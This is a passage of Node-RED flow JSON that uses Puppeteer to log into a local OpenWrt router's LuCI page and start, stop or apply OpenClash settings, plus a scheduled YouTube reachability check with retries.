\u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开配置\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://192.168.80.2/cgi-bin/luci/admin/services/openclash/config-subscribe\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 500, \u0026#34;y\u0026#34;: 1040, \u0026#34;wires\u0026#34;: [ [ \u0026#34;53526f979d42b29f\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;close_browser\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-close\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Close Browser\u0026#34;, \u0026#34;x\u0026#34;: 1200, \u0026#34;y\u0026#34;: 1040, \u0026#34;wires\u0026#34;: [ [] ] }, { \u0026#34;id\u0026#34;: \u0026#34;start\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Start\u0026#34;, \u0026#34;props\u0026#34;: [], \u0026#34;repeat\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;x\u0026#34;: 450, \u0026#34;y\u0026#34;: 920, \u0026#34;wires\u0026#34;: [ [ \u0026#34;62b45a40d5ba785a1\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;62b45a40d5ba785a1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-launch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;slowMo\u0026#34;: 0, \u0026#34;headless\u0026#34;: false, \u0026#34;debugport\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;devtools\u0026#34;: false, \u0026#34;cookies\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;启动浏览器\u0026#34;, \u0026#34;executablePath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;arguments\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 630, \u0026#34;y\u0026#34;: 900, \u0026#34;wires\u0026#34;: [ [ \u0026#34;goto_login\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;7c85207c0e8517b3\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.cbi-button-apply\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击元素\u0026#34;, \u0026#34;x\u0026#34;: 1260, \u0026#34;y\u0026#34;: 900, \u0026#34;wires\u0026#34;: [ [ \u0026#34;delay_1\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;28204d56e197d773\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;#cbid\\\\.table\\\\.1\\\\.Apply\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击元素\u0026#34;, \u0026#34;x\u0026#34;: 1040, \u0026#34;y\u0026#34;: 1040, \u0026#34;wires\u0026#34;: [ [ \u0026#34;close_browser\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;4f27e03e2f173bda\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-waitFor\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;等待元素加载\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;#cbid\\\\.table\\\\.1\\\\.Apply\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;x\u0026#34;: 860, \u0026#34;y\u0026#34;: 1040, \u0026#34;wires\u0026#34;: [ [ \u0026#34;28204d56e197d773\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;53526f979d42b29f\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wait sec\u0026#34;, \u0026#34;pauseType\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;2\u0026#34;, \u0026#34;timeoutUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;rate\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nbRateUnits\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomFirst\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomLast\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;allowrate\u0026#34;: false, \u0026#34;outputs\u0026#34;: 1, \u0026#34;x\u0026#34;: 680, \u0026#34;y\u0026#34;: 1040, \u0026#34;wires\u0026#34;: [ [ \u0026#34;4f27e03e2f173bda\u0026#34; ] ] } ] 注意转义cbid.table.1.enable\nStop [ { \u0026#34;id\u0026#34;: \u0026#34;e10eb904db989e5f\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开登陆\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://192.168.80.2/cgi-bin/luci/\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 740, \u0026#34;y\u0026#34;: 1280, \u0026#34;wires\u0026#34;: [ [ \u0026#34;93b0424aa763b91f\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;93b0424aa763b91f\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-keyboard-type\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Type Password\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;texttype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;x\u0026#34;: 980, \u0026#34;y\u0026#34;: 1280, \u0026#34;wires\u0026#34;: [ [ \u0026#34;d14a3019351ec54d\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;253e32950794717f\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wait sec\u0026#34;, \u0026#34;pauseType\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;timeoutUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;rate\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nbRateUnits\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomFirst\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomLast\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;allowrate\u0026#34;: false, \u0026#34;outputs\u0026#34;: 1, \u0026#34;x\u0026#34;: 1370, \u0026#34;y\u0026#34;: 1280, \u0026#34;wires\u0026#34;: [ [ \u0026#34;e6a43b4abdb5359c\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;e6a43b4abdb5359c\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开配置\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://192.168.80.2/cgi-bin/luci/admin/services/openclash/client\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 410, \u0026#34;y\u0026#34;: 1420, \u0026#34;wires\u0026#34;: [ [ \u0026#34;176134d2c5b9e80e\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;910c68d3f5918773\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-close\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Close Browser\u0026#34;, \u0026#34;x\u0026#34;: 1110, \u0026#34;y\u0026#34;: 1420, \u0026#34;wires\u0026#34;: [ [] ] }, { \u0026#34;id\u0026#34;: \u0026#34;cc73fa426d27cfba\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Stop\u0026#34;, \u0026#34;props\u0026#34;: [], \u0026#34;repeat\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 360, \u0026#34;y\u0026#34;: 1300, \u0026#34;wires\u0026#34;: [ [ \u0026#34;329d96100a9529af\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;329d96100a9529af\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-launch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;slowMo\u0026#34;: 0, \u0026#34;headless\u0026#34;: false, \u0026#34;debugport\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;devtools\u0026#34;: false, \u0026#34;cookies\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;启动浏览器\u0026#34;, \u0026#34;executablePath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;arguments\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 540, \u0026#34;y\u0026#34;: 1280, \u0026#34;wires\u0026#34;: [ [ \u0026#34;e10eb904db989e5f\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;d14a3019351ec54d\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.cbi-button-apply\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击元素\u0026#34;, \u0026#34;x\u0026#34;: 1170, \u0026#34;y\u0026#34;: 1280, \u0026#34;wires\u0026#34;: [ [ \u0026#34;253e32950794717f\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;8a17d4f0e933b157\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;#cbid\\\\.table\\\\.1\\\\.disable\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击停止\u0026#34;, \u0026#34;x\u0026#34;: 950, \u0026#34;y\u0026#34;: 1420, \u0026#34;wires\u0026#34;: [ [ \u0026#34;910c68d3f5918773\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;5661f30fa4d9f665\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-waitFor\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;等待元素加载\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;#cbid\\\\.table\\\\.1\\\\.disable\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;x\u0026#34;: 770, \u0026#34;y\u0026#34;: 1420, \u0026#34;wires\u0026#34;: [ [ \u0026#34;8a17d4f0e933b157\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;176134d2c5b9e80e\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wait sec\u0026#34;, \u0026#34;pauseType\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;timeoutUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;rate\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nbRateUnits\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomFirst\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomLast\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;allowrate\u0026#34;: false, \u0026#34;outputs\u0026#34;: 1, \u0026#34;x\u0026#34;: 590, \u0026#34;y\u0026#34;: 1420, \u0026#34;wires\u0026#34;: [ [ \u0026#34;5661f30fa4d9f665\u0026#34; ] ] } ] OpenClash 关闭成功！\nstart [ { \u0026#34;id\u0026#34;: \u0026#34;46dc8b73e8d1d404\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开登陆\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://192.168.80.2/cgi-bin/luci/\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 760, \u0026#34;y\u0026#34;: 1620, \u0026#34;wires\u0026#34;: [ [ \u0026#34;7fd4a6196f56121f\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;7fd4a6196f56121f\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-keyboard-type\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Type Password\u0026#34;, \u0026#34;text\u0026#34;: \u0026#34;password\u0026#34;, \u0026#34;texttype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;x\u0026#34;: 1000, \u0026#34;y\u0026#34;: 1620, \u0026#34;wires\u0026#34;: [ [ \u0026#34;090ac8764fe48aa5\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;9505d990a122e740\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wait sec\u0026#34;, \u0026#34;pauseType\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;timeoutUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;rate\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nbRateUnits\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomFirst\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomLast\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;allowrate\u0026#34;: false, \u0026#34;outputs\u0026#34;: 1, \u0026#34;x\u0026#34;: 1390, \u0026#34;y\u0026#34;: 1620, \u0026#34;wires\u0026#34;: [ [ \u0026#34;ad88db631300db13\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;ad88db631300db13\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-goto\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;打开配置\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;http://192.168.80.2/cgi-bin/luci/admin/services/openclash/client\u0026#34;, \u0026#34;urltype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;waitUntil\u0026#34;: \u0026#34;networkidle0\u0026#34;, \u0026#34;x\u0026#34;: 430, \u0026#34;y\u0026#34;: 1760, \u0026#34;wires\u0026#34;: [ [ \u0026#34;efc876aec7265f81\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;0edd362b5aa735cd\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-close\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Close Browser\u0026#34;, \u0026#34;x\u0026#34;: 1220, \u0026#34;y\u0026#34;: 1760, \u0026#34;wires\u0026#34;: [ [] ] }, { \u0026#34;id\u0026#34;: \u0026#34;800c64c288a0a493\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;启动~\u0026#34;, \u0026#34;props\u0026#34;: [], \u0026#34;repeat\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 380, \u0026#34;y\u0026#34;: 1640, \u0026#34;wires\u0026#34;: [ [ \u0026#34;bf1961dcc4e2e714\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;bf1961dcc4e2e714\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-browser-launch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;slowMo\u0026#34;: 0, \u0026#34;headless\u0026#34;: false, \u0026#34;debugport\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;devtools\u0026#34;: false, \u0026#34;cookies\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;启动浏览器\u0026#34;, \u0026#34;executablePath\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;arguments\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;x\u0026#34;: 560, \u0026#34;y\u0026#34;: 1620, \u0026#34;wires\u0026#34;: [ [ \u0026#34;46dc8b73e8d1d404\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;090ac8764fe48aa5\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;.cbi-button-apply\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击元素\u0026#34;, \u0026#34;x\u0026#34;: 1190, \u0026#34;y\u0026#34;: 1620, \u0026#34;wires\u0026#34;: [ [ \u0026#34;9505d990a122e740\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;8c0743a7ad9c52f1\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-click\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;#cbid\\\\.table\\\\.1\\\\.enable\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;button\u0026#34;: \u0026#34;left\u0026#34;, \u0026#34;clickCount\u0026#34;: 1, \u0026#34;delay\u0026#34;: 0, \u0026#34;name\u0026#34;: \u0026#34;点击停止\u0026#34;, \u0026#34;x\u0026#34;: 970, \u0026#34;y\u0026#34;: 1760, \u0026#34;wires\u0026#34;: [ [ \u0026#34;0edd362b5aa735cd\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;b7f301a88b4db8fb\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;puppeteer-page-waitFor\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;等待元素加载\u0026#34;, \u0026#34;selector\u0026#34;: \u0026#34;#cbid\\\\.table\\\\.1\\\\.enable\u0026#34;, \u0026#34;selectortype\u0026#34;: \u0026#34;str\u0026#34;, \u0026#34;x\u0026#34;: 780, \u0026#34;y\u0026#34;: 1760, \u0026#34;wires\u0026#34;: [ [ \u0026#34;8c0743a7ad9c52f1\u0026#34; ] ] }, { \u0026#34;id\u0026#34;: \u0026#34;efc876aec7265f81\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;aa0318942b9642a8\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;Wait sec\u0026#34;, \u0026#34;pauseType\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;6\u0026#34;, \u0026#34;timeoutUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;rate\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;nbRateUnits\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomFirst\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomLast\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;randomUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;allowrate\u0026#34;: false, \u0026#34;outputs\u0026#34;: 1, \u0026#34;x\u0026#34;: 580, \u0026#34;y\u0026#34;: 1760, \u0026#34;wires\u0026#34;: [ [ \u0026#34;b7f301a88b4db8fb\u0026#34; ] ] } ] 间隔6s 并执行\n3time [{ \u0026#34;id\u0026#34;: \u0026#34;inject-check\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;inject\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;定时检测\u0026#34;, \u0026#34;props\u0026#34;: [{ \u0026#34;p\u0026#34;: \u0026#34;payload\u0026#34; }, { \u0026#34;p\u0026#34;: \u0026#34;retryCount\u0026#34;, \u0026#34;v\u0026#34;: 0, \u0026#34;vt\u0026#34;: \u0026#34;num\u0026#34; } ], \u0026#34;repeat\u0026#34;: \u0026#34;5m\u0026#34;, \u0026#34;crontab\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;once\u0026#34;: false, \u0026#34;onceDelay\u0026#34;: 0.1, \u0026#34;topic\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payload\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;payloadType\u0026#34;: \u0026#34;date\u0026#34;, \u0026#34;x\u0026#34;: 130, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;http-check\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;http-check\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;http request\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;检测YouTube\u0026#34;, \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;ret\u0026#34;: \u0026#34;txt\u0026#34;, \u0026#34;paytoqs\u0026#34;: \u0026#34;ignore\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.youtube.com\u0026#34;, \u0026#34;tls\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;persist\u0026#34;: false, \u0026#34;proxy\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;insecureHTTPParser\u0026#34;: false, \u0026#34;authType\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;senderr\u0026#34;: false, \u0026#34;headers\u0026#34;: [], \u0026#34;x\u0026#34;: 290, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;condition-check\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;condition-check\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;switch\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;状态判断\u0026#34;, \u0026#34;property\u0026#34;: \u0026#34;statusCode\u0026#34;, \u0026#34;propertyType\u0026#34;: \u0026#34;msg\u0026#34;, \u0026#34;rules\u0026#34;: [{ \u0026#34;t\u0026#34;: \u0026#34;eq\u0026#34;, \u0026#34;v\u0026#34;: \u0026#34;200\u0026#34;, \u0026#34;vt\u0026#34;: \u0026#34;str\u0026#34; }, { \u0026#34;t\u0026#34;: \u0026#34;neq\u0026#34;, \u0026#34;v\u0026#34;: \u0026#34;200\u0026#34;, \u0026#34;vt\u0026#34;: \u0026#34;str\u0026#34; } ], \u0026#34;checkall\u0026#34;: \u0026#34;true\u0026#34;, \u0026#34;repair\u0026#34;: false, \u0026#34;outputs\u0026#34;: 2, \u0026#34;x\u0026#34;: 460, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;success-path\u0026#34;], [\u0026#34;retry-handler\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;retry-handler\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;重试处理器\u0026#34;, \u0026#34;func\u0026#34;: \u0026#34;// 初始化重试计数器\\nmsg.retryCount = msg.retryCount || 0;\\n\\n// 检查是否达到最大重试次数\\nif (msg.retryCount \u0026lt; 2) {\\n // 增加重试计数\\n msg.retryCount++;\\n \\n // 指数退避延迟（5秒 * 重试次数）[7](@ref)\\n const delayTime = 5000 * msg.retryCount;\\n \\n // 创建延迟消息\\n const delayMsg = {\\n payload: msg.payload,\\n retryCount: msg.retryCount,\\n _delay: delayTime\\n };\\n \\n // 返回延迟重试指令\\n return [null, delayMsg];\\n} else {\\n // 达到最大重试次数，执行异常处理\\n return [msg, null];\\n}\u0026#34;, \u0026#34;outputs\u0026#34;: 2, \u0026#34;x\u0026#34;: 630, \u0026#34;y\u0026#34;: 480, \u0026#34;wires\u0026#34;: [ [\u0026#34;fail-path\u0026#34;, \u0026#34;browser-launch\u0026#34;], [\u0026#34;retry-delay\u0026#34;] ] }, { \u0026#34;id\u0026#34;: \u0026#34;retry-delay\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;z\u0026#34;: \u0026#34;f304f1068ba4c3f5\u0026#34;, \u0026#34;name\u0026#34;: \u0026#34;重试延迟\u0026#34;, \u0026#34;pauseType\u0026#34;: \u0026#34;delay\u0026#34;, \u0026#34;timeout\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;timeoutUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;rate\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;nbRateUnits\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;rateUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;randomFirst\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;randomLast\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;randomUnits\u0026#34;: \u0026#34;seconds\u0026#34;, \u0026#34;drop\u0026#34;: false, 